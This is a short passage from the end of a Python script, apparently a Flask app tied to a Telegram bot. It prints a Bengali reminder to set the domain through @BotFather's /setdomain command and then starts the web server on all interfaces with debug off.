    print(f"🔧 @BotFather এ /setdomain কমান্ড দিয়ে আপনার ডোমেইন সেট করুন!")
    print(f"{'='*50}\n")
    
    app.run(host='0.0.0.0', port=port, debug=False)
